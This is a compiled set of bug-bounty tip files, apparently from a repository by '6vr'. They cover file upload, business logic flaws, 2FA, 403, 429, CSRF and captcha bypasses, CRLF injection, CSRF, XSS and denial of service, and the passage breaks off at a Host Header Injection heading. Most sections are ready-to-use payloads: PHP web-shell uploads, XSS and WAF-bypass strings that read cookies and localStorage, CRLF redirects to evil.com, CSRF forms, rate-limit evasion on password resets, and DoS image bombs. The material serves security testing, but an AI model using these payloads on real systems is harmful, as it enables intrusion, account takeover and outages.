<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-6vr
description: CTF writeups and security challenges by 6vr.
---

# Writeups by 6vr

Source repository: `/repos/6vr`

## Repository Index

- Bug-Bounty-Tips/Arbitrary File Upload.md
- Bug-Bounty-Tips/Business Logic Errors.md
- Bug-Bounty-Tips/CRLF Injection.md
- Bug-Bounty-Tips/Cross Site Request Forgery.md
- Bug-Bounty-Tips/Cross Site Scripting.md
- Bug-Bounty-Tips/Denial Of Service.md
- Bug-Bounty-Tips/Host Header Injection.md
- Bug-Bounty-Tips/Insecure Direct Object References.md
- Bug-Bounty-Tips/Local File Inclusion.md
- Bug-Bounty-Tips/OAuth Misconfiguration.md
- Bug-Bounty-Tips/Open Redirect.md
- Bug-Bounty-Tips/Remote File Inclusion.md
- Bug-Bounty-Tips/Web Cache Poisoning.md
- Bug-Bounty-Tips/Bypass/Bypass 2FA.md
- Bug-Bounty-Tips/Bypass/Bypass 304.md
- Bug-Bounty-Tips/Bypass/Bypass 403.md
- Bug-Bounty-Tips/Bypass/Bypass 429.md
- Bug-Bounty-Tips/Bypass/Bypass CSRF.md
- Bug-Bounty-Tips/Bypass/Bypass Captcha.md
- Bug-Bounty-Tips/Misc/Account Takeover.md
- Bug-Bounty-Tips/Misc/Email Spoofing.md
- Bug-Bounty-Tips/Misc/Exposed API keys.md
- Bug-Bounty-Tips/Misc/JWT Vulnerabilities.md
- Bug-Bounty-Tips/Misc/Mass Assignment.md
- Bug-Bounty-Tips/Misc/Password Reset Flaws.md
- Bug-Bounty-Tips/Misc/Tabnabbing.md
- Bug-Bounty-Tips/SQLi/NoSQL Injection.md
- Bug-Bounty-Tips/Technologies/Apache HTTP Server.md
- Bug-Bounty-Tips/Technologies/Confluence.md
- Bug-Bounty-Tips/Technologies/Grafana.md
- Bug-Bounty-Tips/Technologies/HAProxy.md
- Bug-Bounty-Tips/Technologies/Jenkins.md
- Bug-Bounty-Tips/Technologies/Jira.md
- Bug-Bounty-Tips/Technologies/Laravel.md
- Bug-Bounty-Tips/Technologies/Moodle.md
- Bug-Bounty-Tips/Technologies/Nginx.md
- Bug-Bounty-Tips/Technologies/WordPress.md
- Bug-Bounty-Tips/Technologies/Zend.md

## Writeup Content


### File: Bug-Bounty-Tips/Arbitrary File Upload.md

# Arbitrary File Upload

## Introduction
An arbitrary file upload vulnerability is a type of security flaw that allows an attacker to upload malicious files onto a server.

## Where to find
In upload file feature, for example upload photo profile feature

## How to exploit
1. Change the `Content-Type` value
```
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```
Change the Content-Type
```
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/jpeg
```

2. Try to change the extension when send the request, for example in here you cant upload file with ext php but you can upload jpg file
```
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
Content-Type: application/x-php
```
Change the request to this
```
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: application/x-php
```

3. Upload the payload, but start with GIF89a; and
```
POST /images/upload/ HTTP/1.1
Host: target.com
[...]

---------------------------829348923824
Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
Content-Type: image/gif

GIF89a; <?php system("id") ?>
```
And dont forget to change the content-type to image/gif

4. Bypass content length validation, it can be bypassed using small payload
```
(<?=`$_GET[x]`?>)
```

5. Using null byte in filename
```
file.php%00.gif
```

6. Using double extensions for the uploaded file
```
file.jpg.php
```

7.  Uploading an unpopular php extensions (php4,php5,php6,phtml)
```
file.php5
```

8. Try to randomly capitalizes the file extension
```
file.pHP5
```


### File: Bug-Bounty-Tips/Business Logic Errors.md

# Business Logic Errors

## Introduction
Business Logic Errors are ways of using the legitimate processing flow of an application in a way that results in a negative consequence to the organization.

## Where to find
This vulnerability can appear in all features of the application.

## How to exploit
1. Review Functionality
   - Some applications have an option where verified reviews are marked with some tick or it's mentioned. Try to see if you can post a review as a Verified Reviewer without purchasing that product.
   - Some app provides you with an option to provide a rating on a scale of 1 to 5, try to go beyond/below the scale-like provide 0 or 6 or -ve.
   - Try to see if the same user can post multiple ratings for a product. This is an interesting endpoint to check for Race Conditions.
   - Try to see if the file upload field is allowing any exts, it's often observed that the devs miss out on implementing protections on such endpoints. 
   - Try to post reviews like some other users.
   - Try performing CSRF on this functionality, often is not protected by tokens

2. Coupon Code Functionality 
   - Apply the same code more than once to see if the coupon code is reusable. 
   - If the coupon code is uniquely usable, try testing for Race Condition on this function by using the same code for two accounts at a parallel time.
   - Try Mass Assignment or HTTP Parameter Pollution to see if you can add multiple coupon codes while the application only accepts one code from the Client Side. 
   - Try performing attacks that are caused by missing input sanitization such as XSS, SQLi, etc. on this field
   - Try adding discount codes on the products which are not covered under discounted items by tampering with the request on the server-side. 

3. Delivery Charges Abuse 
   - Try tampering with the delivery charge rates to -ve values to see if the final amount can be reduced.
   - Try checking for the free delivery by tampering with the params.

4. Currency Arbitrage 
   - Pay in 1 currency say USD and try to get a refund in EUR. Due to the diff in conversion rates, it might be possible to gain more amount.
  
5. Premium Feature Abuse 
   - Try forcefully browsing the areas or some particular endpoints which come under premium accounts.
   - Pay for a premium feature and cancel your subscription. If you get a refund but the feature is still usable, it's a monetary impact issue.
   - Some applications use true-false request/response values to validate if a user is having access to premium features or not.
   - Try using Burp's Match & Replace to see if you can replace these values whenever you browse the app & access the premium features.
   - Always check cookies or local storage to see if any variable is checking if the user should have access to premium features or not.

6. Refund Feature Abuse
   - Purchase a product (usually some subscription) and ask for a refund to see if the feature is still accessible.
   - Try for currency arbitrage explained yesterday.
   - Try making multiple requests for subscription cancellation (race conditions) to see if you can get multiple refunds.

7. Cart/Wishlist Abuse 
   - Add a product in negative quantity with other products in positive quantity to balance the amount.
   - Add a product in more than the available quantity.
   - Try to see when you add a product to your wishlist and move it to a cart if it is possible to move it to some other user's cart or delete it from there.

8. Thread Comment Functionality
   - Unlimited Comments on a thread
   - Suppose a user can comment only once, try race conditions here to see if multiple comments are possible.
   - Suppose there is an option: comment by the verified user (or some privileged user) try to tamper with various parameters in order to see if you can do this activity.
   - Try posting comments impersonating some other users.

9. Parameter Tampering 
   - Tamper Payment or Critical Fields to manipulate their values
   - Add multiple fields or unexpected fields by abusing HTTP Parameter Pollution & Mass Assignment
   - Response Manipulation to bypass certain restrictions such as 2FA Bypass.


### File: Bug-Bounty-Tips/Bypass/Bypass 2FA.md

# Bypass Two-Factor Authentication

1. Response manipulation

The response is
```
HTTP/1.1 404 Not Found
...
{"code": false}
```
Try this to bypass
```
HTTP/1.1 404 Not Found
...
{"code": true}
```

2. Status code manipulation

The response is
```
HTTP/1.1 404 Not Found
...
{"code": false}
```
Try this to bypass
```
HTTP/1.1 200 OK
...
{"code": false}
```

3. 2FA Code in Response

Always check the response!
```
POST /req-2fa/
Host: vuln.com
...
email=victim@gmail.com
```
The response is
```
HTTP/1.1 200 OK
...
{"email": "victim@gmail.com", "code": "101010"}
```

4. JS Files may contain info about the 2FA Code (Rare case)
   
5. Bruteforce the 2FA code
   
6. Missing 2FA Code integrity validation, code for any user account can be used
```
POST /2fa/
Host: vuln.com
...
email=attacker@gmail.com&code=382923
```
```
POST /2fa/
Host: vuln.com
...
email=victim@gmail.com&code=382923
```
   
7. No CSRF protection on disabling 2FA, also there is no auth confirmation.

8. 2FA gets disabled on password change/email change. 

9. Clickjacking on 2FA disabling page, by iframing the 2FA Disabling page and lure the victim to disable the 2FA. 
    
10. Enabling 2FA doesn't expire previously active sessions, if the session is already hijacked and there is a session timeout vuln.

11. 2FA code reusability, same code can be reused.

12. Enter code 000000
```
POST /2fa/
Host: vuln.com
...
code=00000
```

13. Enter code "null"
```
POST /2fa/
Host: vuln.com
...
code=null
```



### File: Bug-Bounty-Tips/Bypass/Bypass 304.md

# Bypass 304 (Not Modified)

1. Delete "If-None-Match" header
```
GET /admin HTTP/1.1
Host: target.com
If-None-Match: W/"32-IuK7rSIJ92ka0c92kld"
```
Try this to bypass
```
GET /admin HTTP/1.1
Host: target.com
```

2. Adding random character in the end of "If-None-Match" header
```
GET /admin HTTP/1.1
Host: target.com
If-None-Match: W/"32-IuK7rSIJ92ka0c92kld"
```
Try this to bypass
```
GET /admin HTTP/1.1
Host: target.com
Host: target.com
If-None-Match: W/"32-IuK7rSIJ92ka0c92kld" b
```




### File: Bug-Bounty-Tips/Bypass/Bypass 403.md

# Bypass 403 (Forbidden)

1. Using "X-Original-URL" header
```
GET /admin HTTP/1.1
Host: target.com
```
Try this to bypass
```
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

2. Appending **%2e** after the first slash
```
http://target.com/admin => 403
```
Try this to bypass
```
http://target.com/%2e/admin => 200
```

3. Try add dot (.) slash (/) and semicolon (;) in the URL
```
http://target.com/admin => 403
```
Try this to bypass
```
http://target.com/secret/. => 200
http://target.com//secret// => 200
http://target.com/./secret/.. => 200
http://target.com/;/secret => 200
http://target.com/.;/secret => 200
http://target.com//;//secret => 200
```

4. Add "..;/" after the directory name
```
http://target.com/admin
```
Try this to bypass
```
http://target.com/admin..;/
```


5. Try to uppercase the alphabet in the url
```
http://target.com/admin
```
Try this to bypass
```
http://target.com/aDmIN
```

6. Via Web Cache Poisoning
```
GET /anything HTTP/1.1
Host: victim.com
X­-Original-­URL: /admin
```

## Tools
* [Bypass-403 | Go script for bypassing 403 forbidden](https://github.com/daffainfo/bypass-403)


### File: Bug-Bounty-Tips/Bypass/Bypass 429.md

# Bypass 429 (Too Many Requests)
 
1. Try add some custom header
```
X-Forwarded-For : 127.0.0.1
X-Forwarded-Host : 127.0.0.1
X-Client-IP : 127.0.0.1
X-Remote-IP : 127.0.0.1
X-Remote-Addr : 127.0.0.1
X-Host : 127.0.0.1
```
For example:
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
X-Forwarded-For : 127.0.0.1
[...]

email=victim@gmail.com
```

2. Adding Null Byte ( %00 ) or CRLF ( %09, %0d, %0a ) at the end of the Email can bypass rate limit.
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
[...]

email=victim@gmail.com%00
```

3. Try changing user-agents, cookies and IP address
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
Cookie: xxxxxxxxxx
[...]

email=victim@gmail.com
```
Try this to bypass
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
Cookie: aaaaaaaaaaaaa
[...]

email=victim@gmail.com
```

4. Add a random parameter on the last endpoint
```
POST /ForgotPass.php HTTP/1.1
Host: target.com
[...]

email=victim@gmail.com
```
Try this to bypass
```
POST /ForgotPass.php?random HTTP/1.1
Host: target.com
[...]

email=victim@gmail.com
```

5. Add space after the parameter value
```
POST /api/forgotpass HTTP/1.1
Host: target.com
[...]

{"email":"victim@gmail.com"}
```
Try this to bypass
```
POST /api/forgotpass HTTP/1.1
Host: target.com
[...]

{"email":"victim@gmail.com "}
```



### File: Bug-Bounty-Tips/Bypass/Bypass CSRF.md

# Bypass CSRF

1. Change single character
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
```
Try this to bypass
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaab
```

2. Sending empty value of token
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
```
Try this to bypass
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=
```

3. Replace the token with same length
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaa
```
Try this to bypass
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaabaa
```
4. Changing POST / GET method
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
```
Try this to bypass
```
GET /register?username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa HTTP/1.1
Host: target.com
[...]
```

5. Remove the token from request
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=aaaaaaaaaaaaaaaaaaaaaa
```
Try this to bypass
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456
```

6. Use another user's valid token
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=ANOTHER_VALID_TOKEN
```

7. Try to decrypt hash
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=MTIzNDU2
```
MTIzNDU2 => 123456 with base64

8. Sometimes anti-CSRF token is composed by 2 parts, one of them remains static while the others one dynamic
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=vi802jg9f8akd9j123
```
When we register again, the request like this
```
POST /register HTTP/1.1
Host: target.com
[...]

username=dapos&password=123456&token=vi802jg9f8akd9j124
```
If you notice "vi802jg9f8akd9j" part of the token remain same, you just need to send with only static part


### File: Bug-Bounty-Tips/Bypass/Bypass Captcha.md

# Bypass Captcha (Google reCAPTCHA)

1. Try changing the request method, for example POST to GET
```
POST / HTTP 1.1
Host: target.com
[...]

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```

Change the method to GET
```
GET /?_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123 HTTP 1.1
Host: target.com
[...]
```

2. Try remove the value of the captcha parameter
```
POST / HTTP 1.1
Host: target.com
[...]

_RequestVerificationToken=&_Username=daffa&_Password=test123
```

3. Try reuse old captcha token
```
POST / HTTP 1.1
Host: target.com
[...]

_RequestVerificationToken=OLD_CAPTCHA_TOKEN&_Username=daffa&_Password=test123
```

4. Convert JSON data to normal request parameter
```
POST / HTTP 1.1
Host: target.com
[...]

{"_RequestVerificationToken":"xxxxxxxxxxxxxx","_Username":"daffa","_Password":"test123"}
```
Convert to normal request
```
POST / HTTP 1.1
Host: target.com
[...]

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```

5. Try custom header to bypass captcha
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

6. Change some specific characters of the captcha parameter and see if it is possible to bypass the restriction.
```
POST / HTTP 1.1
Host: target.com
[...]

_RequestVerificationToken=xxxxxxxxxxxxxx&_Username=daffa&_Password=test123
```
Try this to bypass
```
POST / HTTP 1.1
Host: target.com
[...]

_RequestVerificationToken=xxxdxxxaxxcxxx&_Username=daffa&_Password=test123
```


### File: Bug-Bounty-Tips/CRLF Injection.md

# CRLF Injection

## Introduction
A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL.

## Where to find
It can be found anywhere, always check the request and response. Try to search for parameters that lead to redirects, you can see the response is (301, 302, 303, 307, 308).

## How to exploit
1. Basic payload
```
https://example.com/?lang=en%0D%0ALocation:%20https://evil.com/
```
The response is
```
HTTP/1.1 200 OK
Content-Type: text/html
Date: Mon, 09 May 2016 14:47:29 GMT
Set-Cookie: language=en
Location: https://evil.com/
```

2. Double encode
```
https://example.com/?lang=en%250D%250ALocation:%20https://evil.com/
```

3. Bypass unicode
```
https://example.com/?lang=en%E5%98%8A%E5%98%8DLocation:%20https://evil.com/
```



### File: Bug-Bounty-Tips/Cross Site Request Forgery.md

# Cross Site Request Forgery (CSRF)

## Introduction
Cross-Site Request Forgery (CSRF/XSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated

## How to exploit
1. HTML GET Method

```html
<a href="http://www.example.com/api/setusername?username=uname">Click Me</a>
```

2. HTML POST Method

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="uname" />
 <input type="submit" value="Submit Request" />
</form>
```

3. JSON GET Method
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

4. JSON POST Method
```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```


### File: Bug-Bounty-Tips/Cross Site Scripting.md

# XSS Cheat Sheet (Basic)

## Introduction
Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into websites. There is 3 types of XSS Attack:
- Reflected XSS

    Attack where the malicious script runs from another website through the web browser    
- Stored XSS
  
    Stored attacks are those where the injected script is permanently stored on the target servers
- DOM-Based XSS

    A type of XSS that has payloads found in the DOM rather than within the HTML code.

## Where to find
This vulnerability can appear in all features of the application. If you want to find Dom-based XSS, you can find it by reading the javascript source code.

## How to exploit
1. Basic payload
```html
<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

2. Add ' or " to escape the payload from value of an HTML tag
```html
"><script>alert(1)</script>
'><script>alert(1)</script> 
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* After input the payload
```html
<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
```

3. Add --> to escape the payload if input lands in HTML comments.
```html
--><script>alert(1)</script>
```

* Example source code
```html
<!-- REFLECTED_HERE --> 
```

* After input the payload
```html
<!-- --><script>alert(1)</script> -->
```

4. Add </tag> when the input inside or between opening/closing tags, tag can be ```<a>,<title>,<script>``` and any other HTML tags
    
```html
</tag><script>alert(1)</script>
"></tag><script>alert(1)</script>
```

* Example source code
```html
<a href="https://target.com/1?status=REFLECTED_HERE">1</a>
```

* After input the payload
```html
<a href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
```

5. Use when input inside an attribute’s value of an HTML tag but > is filtered
```html
" onmouseover=alert(1)
" autofocus onfocus=alert(1)
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* After input the payload
```html
<input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
```

6. Use </script> when input inside ```<script>``` tags
```html
</script><script>alert(1)</script>
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var sitekey = '</script><script>alert(1)</script>';
</script>
```

## **XSS Cheat Sheet (Advanced)**
7. Use when input lands in a script block, inside a string delimited value.
```html
'-alert(1)-'
'/alert(1)//
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var sitekey = ''-alert(1)-'';
</script>
```

8. Same like Number 7. But inside a string delimited value but quotes are escaped by a backslash.
```html
\'alert(1)//
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* If we input payload '-alert(1)-' it will be like this
```html
<script>
    var sitekey = '\'-alert(1)-\'';
</script>
```
The quotes are escaped by a backslash so we need to bypass them

* After input the payload
```html
<script>
    var sitekey = '\\'alert(1)//';
</script>
```

9. Use when there’s multi reflection in the same line of JS code
```html
/alert(1)//\
/alert(1)}//\
```

* Example source code
```html
<script>
    var a = 'REFLECTED_HERE'; var b = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var a = '/alert(1)//\'; var b = '/alert(1)//\';
</script>
```

10. Use when input inside a string delimited value and inside a single logical block like function or conditional (if, else, etc).
```html
'}alert(1);{'
\'}alert(1);{// 
```

* Example source code
```html
<script>
    var greeting;
    var time = 1;
    if (time < 10) {
    test = 'REFLECTED_HERE';
  }
</script>
```

* After input the payload
```html
<script>
    var test;
    var time = 1;
    if (time < 10) {
    test = ''}alert(1);{'';
  }
</script>
```

> Payload number 2 uses when quote escaped by backslash

11. Use when input lands inside backticks delimited strings
```html
${alert(1)}
```

* Example source code
```html
<script>
    var dapos = `REFLECTED_HERE`;
</script>
```

* After input the payload
```html
<script>
    var dapos = `${alert(1)}`;
</script>
```

12. Uses when there is multiple reflections on same page. (Double Reflection)
```html
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*
```

* After input the payload
```html
<!DOCTYPE html>
<html>
<body>
'onload=alert(1)><svg/1='
[...]
'onload=alert(1)><svg/1='
</body>
</html>
```

13. Uses when there is multiple reflections on same page. (Triple Reflection)
```html
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='
```

* After input the payload
```html
<!DOCTYPE html>
<html>
<body>
*/alert(1)">'onload="/*<svg/1='
[...]
*/alert(1)">'onload="/*<svg/1='
[...]
*/alert(1)">'onload="/*<svg/1='
</body>
</html>
```

14. XSS in filename (File Upload) Use when uploaded filename is reflected somewhere in target page
```
"><svg onload=alert(1)>.jpeg
```

15. XSS in metadata (File Upload) Use when uploaded metada is reflected somewhere in target page (using exiftool)
```
$ exiftool -Artist='"><script>alert(1)</script>' dapos.jpeg
```

16. XSS with SVG file (File Upload)
```
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

17. XSS via markdown
```
[Click Me](javascript:alert('1'))
```

18. XSS in XML page
```
<a:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</a:script>
```
> Add a "-->" to payload if input lands in a comment section

> Add a "]]>" if input lands in a CDATA section

## **XSS Cheat Sheet (Bypass)**
19. Mixed Case
```html
<Script>alert(document.cookie)</Script> 
```

20. Unclosed Tags
```html
<svg onload="alert(1)"
```

21. Uppercase Payloads
```html
<SVG ONLOAD=ALERT(1)>
```

22. Encoded XSS
```html
(Encoded)
%3Csvg%20onload%3Dalert(1)%3E 

(Double Encoded)
%253Csvg%2520onload%253Dalert%281%29%253E 

(Triple Encoded)
%25253Csvg%252520onload%25253Dalert%25281%2529%25253E 
```

23. JS Lowercased Input
```html
<SCRİPT>alert(1)</SCRİPT>
```

24. PHP Email Validation Bypass
```html
<svg/onload=alert(1)>"@gmail.com
```

25. PHP URL Validation Bypass
```html
javascript://%250Aalert(1)
```

26. Inside Comments Bypass
```html
<!--><svg onload=alert(1)-->
```

## Bypass WAF
1. Cloudflare
```
<svg%0Aonauxclick=0;[1].some(confirm)//

<svg onload=alert%26%230000000040"")>

<a/href=j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(1)&rpar;>
<svg onx=() onload=(confirm)(1)>

<svg onx=() onload=(confirm)(document.cookie)>

<svg onx=() onload=(confirm)(JSON.stringify(localStorage))>

Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();

"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;

Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();

"><onx=[] onmouseover=prompt(1)>

%2sscript%2ualert()%2s/script%2u -xss popup

<svg onload=alert%26%230000000040"1")>

"Onx=() onMouSeoVer=prompt(1)>"Onx=[] onMouSeoVer=prompt(1)>"/*/Onx=""//onfocus=prompt(1)>"//Onx=""/*/%01onfocus=prompt(1)>"%01onClick=prompt(1)>"%2501onclick=prompt(1)>"onClick="(prompt)(1)"Onclick="(prompt(1))"OnCliCk="(prompt`1`)"Onclick="([1].map(confirm))

[1].map(confirm)'ale'+'rt'()a&Tab;l&Tab;e&Tab;r&Tab;t(1)prompt&lpar;1&rpar;prompt&#40;1&#41;prompt%26%2300000000000000000040;1%26%2300000000000000000041;(prompt())(prompt``)

<svg onload=prompt%26%230000000040document.domain)>

<svg onload=prompt%26%23x000000028;document.domain)>

<svg/onrandom=random onload=confirm(1)>

<video onnull=null onmouseover=confirm(1)>

<a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus>

:javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie

<img ignored=() src=x onerror=prompt(1)>
```


### File: Bug-Bounty-Tips/Denial Of Service.md

# Denial of Service

## Introduction
Denial of Service is a type of attack on a service that disrupts its normal function and prevents other users from accessing it

## Where to find
This vulnerability can appear in all features of the application. Depending on how to exploit it, for example in the file upload feature, you can upload very large files

## How to exploit
1. Cookie bomb
   
```
https://target.com/index.php?param1=xxxxxxxxxxxxxx
```
After input "xxxxxxxxxxxxxx" as a value of param1, check your cookies. If there is cookies the value is "xxxxxxxxxxxxxxxxxxxxxx" it means the website is vulnerable

2. Try input a very long payload to form. For example using very long password or using very long email
```
POST /Register HTTP/1.1
Host: target.com
[...]

username=victim&password=aaaaaaaaaaaaaaa
```

3. Pixel flood, using image with a huge pixels

Download the payload: [Here](https://daffa.tech/lottapixel3.jpg)

4. Frame flood, using GIF with a huge frame

Download the payload: [Here](https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/000/136/902000ac102f14a36a4d83ed9b5c293017b77fc7/uber.gif?response-content-disposition=attachment%3B%20filename%3D%22uber.gif%22%3B%20filename%2A%3DUTF-8%27%27uber.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ245MJJPA%2F20200910%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20200910T110848Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEFMaCXVzLXdlc3QtMiJHMEUCIEC768ifpRHeEUucuNuVL%2FdcSsWMnGeNp%2FMhKs6afB01AiEAiZOP%2FwMaeQMITUni3aFcACIOqOHnWHgLKuXHRrb5LooqtAMIXBABGgwwMTM2MTkyNzQ4NDkiDHHy9PJ2ccl9cmsvyCqRA6bliBHBMPXR6NYflM%2BCXCCQ5VLdPCATpmLs9DhVuYsjxR3JUtVHnBvtfEYYWDWWsLoC3xuzmug5ycrAvqK%2BTYDYO7l4HD1rXfyEBkR579ZlUFab6bOL4i8nDqblun%2FeV253Sgd6GzL4E%2FXmUN%2FC6qNydSd9hp2fLoyNjqob6o5zJjmnqvZsq50ROOZwf1idkDtr163qeVZERnan7aY9rM%2FsX4iVdE4wY0rLw1maGRuDF2aLVCxPB681htsHt%2FpoZ18QY7LjcbNjbjB4PgXLd1sm5zQ4q9mPVxTZPvzo9BJCh7l6kMLHCtJXOXfrvvN8UBgIqr1KXvodzv7FRQYcvEpfw4pwCTWzBs8VeEcwS9gjOXFMNLNI8SZ9V76VQ5KrOIpKhzM9UQQN3DVzY3SwMHydX%2B%2BYcQTt%2FjvqTkorsltqob2g5E1K0U8btRLBvBqOo0Vbr75zLcLUUomDBQzSNSvJgTN43huYmkZxBpWAAId72Tt6m56aFQLXkCKGSoMxYjrrVW9jc37pVl3lZU7FIX0AMIuN6PoFOusBpDCrjFwR1Y7t7W8wLapYjI6yOkkvWTFwWvx38jZl9okqo5xchKolmKxKX7cfGPIyuUmSXc1xa0nKwYeOYlhQZfyI0NobqyWW81ITuuUjsBxULuqrXqfVl0PTjTTpqe%2FHvU6wYSE358XfggtcqaH9PPgNDOejgv%2FLnh9AH9nyqIWuaCu865IfAOupVVzFzQilyB2LDyQtTS4Kp5dHyEAibRQlqeKHWOkUE2mQefAaTxKLRKrs0mJQYSuC%2B4LQEB3Cq9Nhj5HN%2BYT7A7CDLrvyChyfYXQZYr0lR1jN91Yd7SBe2jB1Qls%2Bx%2FEUlQ%3D%3D&X-Amz-Signature=910a3812cf3b69f6fa72f39a89a6df2f395f8d17ef8702eeb164a0477c64fff5)

5. Sometimes in website we found a parameter that can adjust the size of the image, for example
```
https://target.com/img/vulnerable.jpg?width=500&height=500
```
Try change "500" to "99999999999"
```
https://target.com/img/vulnerable.jpg?width=99999999999&height=99999999999
```

6. Try changing the value of the header with something new, for example:
```
Accept-Encoding: gzip, gzip, deflate, br, br
```

7. Sometimes if you try bug "No rate limit", after a long try it. The server will go down because there is so much requests

8. ReDoS (Regex DoS) occurs due to poorly implemented RegEx

9. CPDoS ([Cache Poisoned Denial of Service](https://cpdos.org/))
- HTTP Header Oversize (HHO)
  
  A malicious client sends an HTTP GET request including a header larger than the size supported by the origin server but smaller than the size supported by the cache
  ```
  GET /index.html HTTP/1.1
  Host: victim.com
  X-Oversized-Header-1: Big_Value 
  ```
  The response is
  ```
  HTTP/1.1 400 Bad Request
  ...
  Header size exceeded
  ```
- HTTP Meta Character (HMC)
  
  this attack tries to bypass a cache with a request header containing a harmful meta character. Meta characters can be, e.g., control characters such as line break/carriage return (\n), line feed (\r) or bell (\a).

  ```
  GET /index.html HTTP /1.1
  Host: victim.com
  X-Meta-Malicious-Header: \r\n
  ```
  The response is
  ```
  HTTP/1.1 400 Bad Request
  ...
  Character not allowed
  ```
- HTTP Method Override (HMO)

  There are several headers present in HTTP Standard that allow modifying overriding the original HTTP header. Some of these headers are:
  ```
  1. X-HTTP-Method-Override
  2. X-HTTP-Method
  3. X-Method-Override
  ```
  The header instructs the application to override the HTTP method in request.
  ```
  GET /index.php HTTP/1.1
  Host: victim.com
  X-HTTP-Method-Override: POST
  ```
  The response is
  ```
  HTTP/1.1 404 Not Found
  ...
  POST on /index.php not foudn
  ```

- X-Forwarded-Port
  ```
  GET /index.php?dontpoisoneveryone=1 HTTP/1.1
  Host: www.hackerone.com
  X-Forwarded-Port: 123
  ```

- X-Forwarded-Host
  ```
  GET /index.php?dontpoisoneveryone=1 HTTP/1.1
  Host: www.hackerone.com
  X-Forwarded-Host: www.hackerone.com:123
  ```


### File: Bug-Bounty-Tips/Host Header Injection.md

# Host Header Injection

## Introduction
